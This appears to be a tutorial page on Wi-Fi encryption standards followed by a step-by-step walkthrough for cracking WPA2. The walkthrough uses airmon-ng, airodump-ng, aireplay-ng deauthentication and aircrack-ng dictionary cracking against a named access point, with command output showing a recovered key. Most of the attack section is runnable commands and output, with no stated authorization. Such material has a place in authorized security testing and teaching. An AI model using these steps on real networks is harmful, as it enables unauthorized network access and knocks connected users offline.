# Wireless Standards

IEEE 802.11 is part of the [IEEE 802](https://en.wikipedia.org/wiki/IEEE_802) set of [local area network](https://en.wikipedia.org/wiki/Local_area_network) (LAN) [technical standards](https://en.wikipedia.org/wiki/Technical_standard), and specifies the set of [media access control](https://en.wikipedia.org/wiki/Media_access_control) (MAC) and [physical layer](https://en.wikipedia.org/wiki/Physical_layer) (PHY) protocols for implementing [wireless local area network](https://en.wikipedia.org/wiki/Wireless_local_area_network) (WLAN) computer communication.

The standard and amendments provide the basis for wireless network products using the [Wi-Fi](https://en.wikipedia.org/wiki/Wi-Fi) brand and are the world's most widely used wireless computer networking standards.

IEEE 802.11 is used in most home and office networks to allow [laptops](https://en.wikipedia.org/wiki/Laptop), [printers](https://en.wikipedia.org/wiki/Printer_(computing)), [smartphones](https://en.wikipedia.org/wiki/Smartphone), and other devices to communicate with each other and access the Internet without connecting wires.

"Source: Wikipedia, the free encyclopedia"

![IEEE Wi-Fi Standards Cheat Sheet 2024](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcCTXv5Gm3iKAU4jyi5bgXHmXZ-UyuItMJp1TpM4agVGKVzCT6Tgibb8Gb9lpQvLdUv1zsyybYybac_yT0h21InFSP_kKXEL2mJfTEVRTcz643WQbOEagvqwrQOFEII7W8IVmY31h5qgtWA65KL01WmHjo?key=8adlEp2vBae7QOtt3gQUdQ)

|   |   |   |   |   |
|---|---|---|---|---|
|## Encryption Type|## Full Form|## Security|## Configurable|## Notes|
|Open||Poor|Poor|Weakest Security|
|WPS|Wireless Protected Setup|Poor|Poor|Easily Hacked by PIN Guessing|
|WEP|Wired Equivalent Privacy|Poor|Hard|Hacked by Flooding|
|WPA|WIFI Protected Access|Poor|More or Less|Dictionary attack|
|WPA2|WIFI Protected Access Version 2|Good|Normal|Dictionary Attack|
|WPA3|WIFI Protected Access Version 3|Excellent|Excellent|Few Attacks|

While WPA2 offers more protection than WPA and therefore provides even more protection than WEP, the security of your router heavily depends on the password you set. WPA and WPA2 let you use passwords of up to 63 characters.

# WIFI Discovery

## Hardware Requirement:

Network Card Support Monitoring Mode

## Software Requirement:

### Handshake Capture Tool

- Wifite
- Airmon Suite

### Cracking Handshake

- Wifite
- Airmon Suite
- Hashcat

# WIFI Hardware Tools

Make sure your USB/Card is compatible with Kali Linux or the wifi assessment tools.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe7HPbhm1zir2j_hMpMKV6RDrXiZkXofDdDaxeWx8dI3f7YHkGOTFs3DQbTpCU6c7M7IZeDnEwlPlhAUPH1GOVwB_w1CE_JHrsJdBEdOTFm4U9v4X_dB2eE8rKR0954vTmLlOBGu8FNQCUBXvEyLlXSDx0?key=8adlEp2vBae7QOtt3gQUdQ) ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdaAjBpYKhi3ePNgdBtZJxPCIiR7BJjAal_52knEDR-1nLu8u3nzhM2OoFCEoEsQQrQ9Lny4BxBP01pqrjkpjNxZfEBgNZ_aYR1xgyTD2IcvR7sVN5O8RnubKdfd40x5xGYuAjoD1Ol7erRZdH870OvKBTc?key=8adlEp2vBae7QOtt3gQUdQ)

# WPA2 Hacking Process

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdM6aHKdiHN2aFyDmgVA7CoZ_fLJH8nK40W6y8jXKzl5RG0D5wlkSaQaO1PoFHzXaLS8zj9rPnz_--D_GKHNEtj4r973csol5X4qvvK1oVJxofPv3AAvOjt4BVd_mnoeZGCX0o4qJyySGOEKYqJ3xqx_vQ?key=8adlEp2vBae7QOtt3gQUdQ)

Below are the requirements and technical steps to crack WPA/WPA2 using many Linux distributions like Kali Linux.

## Requirements:

- Installed Kali Linux
- Wireless adapter capable of injection/monitor mode
- Wordlist to try to crack the password
- Patience

## Technical Steps 

1- Make sure your wireless adapter is capable of injection.

2- Disconnect from all wireless networks, open a terminal and enter airmon-ng.

➜   airmon-ng 

PHY Interface Driver Chipset

phy0 wlp8s0 iwlwifi Intel Corporation Wi-Fi 6 AX200 (rev 1a)

 3- Type airmon-ng start followed by your wireless card interface. My wlp8s0, so my command would look like this:

➜   airmon-ng start wlp8s0

Found 4 processes that could cause trouble.

Kill them using 'airmon-ng check kill' before putting

the card in monitor mode, they will interfere by changing channels

and sometimes putting the interface back in managed mode

    PID Name

    743 avahi-daemon

    753 NetworkManager

    801 wpa_supplicant

    820 avahi-daemon

PHY Interface Driver Chipset

phy0 wlp8s0 iwlwifi Intel Corporation Wi-Fi 6 AX200 (rev 1a)

(mac80211 monitor mode vif enabled for [phy0]wlp8s0 on [phy0]wlp8s0mon)

(mac80211 station mode vif disabled for [phy0]wlp8s0)

 The “ monitor mode enabled” message means that the card has been successfully inserted into monitoring mode. Notice the name of the new monitor interface, I have wlp8s0mon.

3- Type Airodump-ng with the name of your monitor interface, which is probably wlp8s0mon.

4- Then press Ctrl + C on your keyboard to stop the process. Pay attention to the channel of your target.

CH  5 ][ Elapsed: 6 s ][ 2021-05-24 00:06 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 EE:XX:XX:20:38:77  -15        1        6    2   9  360   WPA2 CCMP   PSK                                           

 FA:XX:XX:95:82:E6  -19        2        0    0   9   65   OPN                                                 

 0E:B6:D2:AB:C1:C1  -46       11        2    0   3  360   WPA2 CCMP   PSK  Egycondor                                      

 EE:XX:XX:C5:3D:F0  -73        6      111    0   9  360   WPA2 CCMP   PSK                                          

 74:XX:XX:FE:49:64  -83        7        0    0   3  130   WPA2 CCMP   PSK                                            

 0E:XX:XX:6E:B4:D0  -86        8        0    0   3  360   WPA2 CCMP   PSK                                              

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   BC:85:56:F1:59:82  -87    0 - 1    202        5                                                        

 EE:XX:XX:20:38:77  74:XX:28:11:D8:89  -77    0 - 1     23        8                                                        

 0E:B6:D2:AB:C1:C1  80:XX:16:7E:2A:6A  -70    0 - 6e     0        1                                                        

 EE:XX:XX:C5:3D:F0  C0:XX:CD:14:20:69  -72    0 - 0e     0        1                                                        

 EE:XX:XX:C5:3D:F0  BA:XX:9A:5A:20:45  -72    0 - 1e     0        3                                                        

 EE:XX:XX:C5:3D:F0  A4:XX:33:5B:05:CC  -75    0 - 1e     1        3                                                        

 EE:XX:XX:C5:3D:F0  F2:XX:59:55:38:7D  -83    0e- 1e    99      121                                                        

Quitting...

At the moment, you will use Airodump to monitor the target and capture more specific information about it using the below command filter and save the output to your local drive.

airodump-ng -c 3 --bssid 0E:B6:D2:AB:C1:C1 -w /root/ wlp8s0mon

The output will show one client is connected to the BSSID.

CH  3 ][ Elapsed: 6 s ][ 2021-05-24 00:17 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 0E:B6:D2:AB:C1:C1  -45   3      106       22    0   3  360   WPA2 CCMP   PSK  Egycondor                                  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 0E:B6:D2:AB:C1:C1  80:XX:16:7E:2A:6A  -68    1e- 6e  1538        7

What we are really doing now is waiting for the device to reconnect to the network, forcing the target's AP to send a four-way Handshake, which we must capture to crack the password.

Instead of waiting for a device to connect, We're actually going to use another tool that belongs to the Aircrack suite called aireplay-ng to force the device to reconnect by sending deauth packets to the device, making it think it should reconnect to the AP.

6- Open another terminal and type this command to do the deauth operation. 

aireplay-ng -0 2 -a 0E:B6:D2:AB:C1:C1-c 80:AD:16:7E:2A:6A wlp8s0mon

 Notice on the top right of the terminal that the WPA handshake has been captured. 

CH  3 ][ Elapsed: 1 min ][ 2021-05-24 00:27 ][ WPA handshake: 0E:XX:D2:AB:C1:C1 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 0E:XX:D2:AB:C1:C1  -44 100      802      530   12   3  360   WPA2 CCMP   PSK  Egycondor

Aircrack-ng will start the password cracking process and will be able to crack it if the password is in the Worlist that you have chosen and cracking the password can take a long time depending on the size of the wordlist. 

aircrack-ng -a2 -b 0E:B6:D2:AB:C1:C1 -w /root/passwords /root/*.cap

                              Aircrack-ng 1.6 

      [00:00:00] 6/21 keys tested (125.78 k/s) 

      Time left: 0 seconds                                      33.33%

                        KEY FOUND! [ XXXXXXXXXXXXXXX ]

      Master Key     : XX 1A 0B XX E3 XX 7B 91 07 C9 71 FC XX D6 98 XX 

                       XX D8 A2 34 XX 1E FF A5 97 0E 72 XX A1 BE 50 D5 

      Transient Key  : 68 90 3F 24 XX BC 22 DF XX 6D 13 F7 AD 92 9F D1 

                       7F 0B A8 28 C0 28 C6 XX AA BA D3 96 58 E1 67 99 

                       XX EB 5B CC 7F XX B6 46 E2 AB C3 CD 9F 4B C1 10 

                       AD XX 33 FC XX 27 98 D7 XX 2E E3 93 37 00 00 00 

      EAPOL HMAC     : 6A 82 58 XX E0 6F A3 XX 07 44 XX 19 31 XX D1 9A 

#  [Wifite](https://github.com/derv82/wifite)

Another tool here is called Wifite which is an automated wireless attack tool and was designed for use with penetration testing distributions of Linux, such as [Kali Linux](http://www.kali.org/), [Pentoo](http://www.pentoo.ch/), and [BackBox](http://www.backbox.org/); any Linux distributions with wireless drivers patched for injection.

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfq_p72d72nDEl-buo5N7iIU6jkipvCMcl-V7HnxwwFB_uGHlDRXEogSfrjPof8cZhgTgrGzg8m0IC6Mg_OL9ilfAd4WXMJJp3jS_zo082_XcA_RBcjls0HQk0oeudmPQSFhTkiWqCiY0d00by-BV0ttkvL?key=8adlEp2vBae7QOtt3gQUdQ)